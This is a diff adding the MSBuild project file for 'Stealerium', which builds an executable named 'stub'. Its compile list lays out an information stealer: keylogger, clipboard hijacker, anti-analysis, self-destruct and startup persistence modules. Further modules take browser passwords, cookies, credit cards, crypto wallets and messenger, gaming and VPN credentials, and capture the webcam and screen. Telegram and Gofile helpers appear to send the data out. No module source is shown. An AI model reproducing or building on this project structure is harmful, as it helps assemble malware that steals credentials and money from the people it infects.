@@ -1,0 +1,362 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{2FFDFCA9-31A2-4EE5-B87C-AE5B8D20096D}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Stealerium</RootNamespace>
+    <AssemblyName>stub</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <PublishUrl>publish\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <ApplicationRevision>2</ApplicationRevision>
+    <ApplicationVersion>1.0.0.2</ApplicationVersion>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <PublishWizardCompleted>true</PublishWizardCompleted>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+    <TargetFrameworkProfile />
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+  </PropertyGroup>
+  <PropertyGroup>
+    <SignManifests>false</SignManifests>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>Stealerium.Stub.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ManifestCertificateThumbprint>6A9AA4856279A17B27829A18413C03FF15799110</ManifestCertificateThumbprint>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ManifestKeyFile>Stealerium_TemporaryKey.pfx</ManifestKeyFile>
+  </PropertyGroup>
+  <PropertyGroup>
+    <GenerateManifests>false</GenerateManifests>
+  </PropertyGroup>
+  <PropertyGroup>
+    <TargetZone>LocalIntranet</TargetZone>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>Properties\app.manifest</ApplicationManifest>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x64'">
+    <DebugSymbols>true</DebugSymbols>
+    <OutputPath>..\Binaries\Debug\net8.0-windows\Stub\</OutputPath>
+    <DefineConstants>TRACE;DEBUG</DefineConstants>
+    <DebugType>full</DebugType>
+    <PlatformTarget>x64</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+    <Prefer32Bit>true</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x64'">
+    <OutputPath>..\Binaries\Release\net8.0-windows\Stub\</OutputPath>
+    <DefineConstants>RELEASE</DefineConstants>
+    <Optimize>true</Optimize>
+    <PlatformTarget>x64</PlatformTarget>
+    <GenerateSerializationAssemblies>Off</GenerateSerializationAssemblies>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+    <Prefer32Bit>true</Prefer32Bit>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.ComponentModel.Composition" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Numerics" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Clipper\Clipboard.cs" />
+    <Compile Include="Clipper\ClipLogger.cs" />
+    <Compile Include="Clipper\Clipper.cs" />
+    <Compile Include="Clipper\EventManager.cs" />
+    <Compile Include="Clipper\Patterns.cs" />
+    <Compile Include="Config.cs" />
+    <Compile Include="Helpers\ZipManager.cs" />
+    <Compile Include="Target\Browsers\BrowserWalletExtensionsHelper.cs" />
+    <Compile Include="Telegram.cs" />
+    <Compile Include="Helpers\GofileFileService.cs" />
+    <Compile Include="Helpers\ClipboardManager.cs" />
+    <Compile Include="Helpers\CommandHelper.cs" />
+    <Compile Include="Helpers\Counter.cs" />
+    <Compile Include="Helpers\Filemanager.cs" />
+    <Compile Include="Helpers\Flags.cs" />
+    <Compile Include="Helpers\Logging.cs" />
+    <Compile Include="Helpers\Report.cs" />
+    <Compile Include="Modules\Implant\AntiAnalysis.cs" />
+    <Compile Include="Modules\Implant\Mutex.cs" />
+    <Compile Include="Modules\Implant\SelfDestruct.cs" />
+    <Compile Include="Modules\Implant\StartDelay.cs" />
+    <Compile Include="Modules\Implant\Startup.cs" />
+    <Compile Include="Modules\Implant\StringsCrypt.cs" />
+    <Compile Include="Modules\Keylogger\EventManager.cs" />
+    <Compile Include="Modules\Keylogger\Keylogger.cs" />
+    <Compile Include="Modules\Keylogger\PornDetection.cs" />
+    <Compile Include="Modules\WindowManager.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Target\Browsers\Chromium\AesGcm.cs" />
+    <Compile Include="Target\Browsers\Chromium\AutoFill.cs" />
+    <Compile Include="Target\Browsers\Chromium\BCrypt.cs" />
+    <Compile Include="Target\Browsers\Chromium\Bookmarks.cs" />
+    <Compile Include="Target\Browsers\Chromium\Chromium.cs" />
+    <Compile Include="Target\Browsers\Chromium\Cookies.cs" />
+    <Compile Include="Target\Browsers\Chromium\CreditCards.cs" />
+    <Compile Include="Target\Browsers\Chromium\Downloads.cs" />
+    <Compile Include="Target\Browsers\Chromium\Extensions.cs" />
+    <Compile Include="Target\Browsers\Chromium\History.cs" />
+    <Compile Include="Target\Browsers\Chromium\Passwords.cs" />
+    <Compile Include="Target\Browsers\Edge\AutoFill.cs" />
+    <Compile Include="Target\Browsers\Edge\Bookmarks.cs" />
+    <Compile Include="Target\Browsers\Edge\CreditCards.cs" />
+    <Compile Include="Target\Browsers\Edge\Edge.cs" />
+    <Compile Include="Target\Browsers\Edge\Extensions.cs" />
+    <Compile Include="Target\Browsers\Firefox\Bookmarks.cs" />
+    <Compile Include="Target\Browsers\Firefox\Cookies.cs" />
+    <Compile Include="Target\Browsers\Firefox\Decryptor.cs" />
+    <Compile Include="Target\Browsers\Firefox\Firefox.cs" />
+    <Compile Include="Target\Browsers\Firefox\History.cs" />
+    <Compile Include="Target\Browsers\Firefox\Logins.cs" />
+    <Compile Include="Target\Browsers\Firefox\Passwords.cs" />
+    <Compile Include="Target\FileZilla.cs" />
+    <Compile Include="Target\Gaming\BattleNET.cs" />
+    <Compile Include="Target\Gaming\Minecraft.cs" />
+    <Compile Include="Target\Gaming\Steam.cs" />
+    <Compile Include="Target\Gaming\Uplay.cs" />
+    <Compile Include="Target\Messengers\Discord.cs" />
+    <Compile Include="Target\Messengers\Element.cs" />
+    <Compile Include="Target\Messengers\Signal.cs" />
+    <Compile Include="Target\Messengers\Tox.cs" />
+    <Compile Include="Target\Messengers\Outlook.cs" />
+    <Compile Include="Target\Messengers\Pidgin.cs" />
+    <Compile Include="Target\Messengers\Icq.cs" />
+    <Compile Include="Target\Messengers\Skype.cs" />
+    <Compile Include="Target\Messengers\Telegram.cs" />
+    <Compile Include="Target\Passwords.cs" />
+    <Compile Include="Target\System\ActiveWindows.cs" />
+    <Compile Include="Target\System\DirectoryTree.cs" />
+    <Compile Include="Target\System\FileGrabber.cs" />
+    <Compile Include="Target\System\Info.cs" />
+    <Compile Include="Target\System\InstalledApps.cs" />
+    <Compile Include="Target\System\ProductKey.cs" />
+    <Compile Include="Target\System\WebcamScreenshot.cs" />
+    <Compile Include="Helpers\Banking.cs" />
+    <Compile Include="Helpers\Common.cs" />
+    <Compile Include="Helpers\Paths.cs" />
+    <Compile Include="Helpers\SQLite.cs" />
+    <Compile Include="Helpers\SqlReader.cs" />
+    <Compile Include="Target\Browsers\BrowserUtils.cs" />
+    <Compile Include="Target\System\Wifi.cs" />
+    <Compile Include="Target\System\ProcessList.cs" />
+    <Compile Include="Target\System\DesktopScreenshot.cs" />
+    <Compile Include="Target\System\SystemInfo.cs" />
+    <Compile Include="Target\VPN\NordVPN.cs" />
+    <Compile Include="Target\VPN\OpenVPN.cs" />
+    <Compile Include="Target\VPN\ProtonVPN.cs" />
+    <Compile Include="Target\Wallets.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+    <None Include="Properties\app.manifest" />
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include=".NETFramework,Version=v4.8">
+      <Visible>False</Visible>
+      <ProductName>Microsoft .NET Framework 4.8 %28x86 and x64%29</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="FodyWeavers.xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <PackageReference Include="Costura.Fody">
+      <Version>5.7.0</Version>
+      <PrivateAssets>all</PrivateAssets>
+    </PackageReference>
+    <PackageReference Include="Fody">
+      <Version>6.8.2</Version>
+      <PrivateAssets>all</PrivateAssets>
+    </PackageReference>
+    <PackageReference Include="Microsoft.AspNet.WebApi.Client">
+      <Version>6.0.0</Version>
+    </PackageReference>
+    <PackageReference Include="Microsoft.NETCore.Platforms">
+      <Version>7.0.4</Version>
+    </PackageReference>
+    <PackageReference Include="Microsoft.Win32.Primitives">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="NETStandard.Library">
+      <Version>2.0.3</Version>
+    </PackageReference>
+    <PackageReference Include="Newtonsoft.Json">
+      <Version>13.0.3</Version>
+    </PackageReference>
+    <PackageReference Include="PasswordGenerator">
+      <Version>2.1.0</Version>
+    </PackageReference>
+    <PackageReference Include="Polly">
+      <Version>8.4.2</Version>
+    </PackageReference>
+    <PackageReference Include="SharpZipLib">
+      <Version>1.4.2</Version>
+    </PackageReference>
+    <PackageReference Include="SharpZipLib">
+      <Version>1.4.2</Version>
+    </PackageReference>
+    <PackageReference Include="System.AppContext">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Collections">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Collections.Concurrent">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Console">
+      <Version>4.3.1</Version>
+    </PackageReference>
+    <PackageReference Include="System.Diagnostics.Debug">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Diagnostics.DiagnosticSource">
+      <Version>8.0.1</Version>
+    </PackageReference>
+    <PackageReference Include="System.Diagnostics.Tools">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Diagnostics.Tracing">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Globalization">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Globalization.Calendars">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.IO.Compression">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.IO.Compression.ZipFile">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.IO.FileSystem">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Linq">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Linq.Expressions">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Net.Http">
+      <Version>4.3.4</Version>
+    </PackageReference>
+    <PackageReference Include="System.Net.Primitives">
+      <Version>4.3.1</Version>
+    </PackageReference>
+    <PackageReference Include="System.Net.Sockets">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.ObjectModel">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Reflection">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Reflection.Extensions">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Reflection.Primitives">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Resources.ResourceManager">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Runtime">
+      <Version>4.3.1</Version>
+    </PackageReference>
+    <PackageReference Include="System.Runtime.Extensions">
+      <Version>4.3.1</Version>
+    </PackageReference>
+    <PackageReference Include="System.Runtime.Handles">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Runtime.InteropServices">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Runtime.InteropServices.RuntimeInformation">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Runtime.Numerics">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Security.Cryptography.Algorithms">
+      <Version>4.3.1</Version>
+    </PackageReference>
+    <PackageReference Include="System.Security.Cryptography.X509Certificates">
+      <Version>4.3.2</Version>
+    </PackageReference>
+    <PackageReference Include="System.Text.Encoding">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Text.Encoding.Extensions">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Text.Json">
+      <Version>8.0.4</Version>
+    </PackageReference>
+    <PackageReference Include="System.Text.RegularExpressions">
+      <Version>4.3.1</Version>
+    </PackageReference>
+    <PackageReference Include="System.Threading">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Threading.Tasks">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Threading.Timer">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="System.Xml.ReaderWriter">
+      <Version>4.3.1</Version>
+    </PackageReference>
+    <PackageReference Include="System.Xml.XDocument">
+      <Version>4.3.0</Version>
+    </PackageReference>
+    <PackageReference Include="WPF-UI">
+      <Version>3.0.5</Version>
+    </PackageReference>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
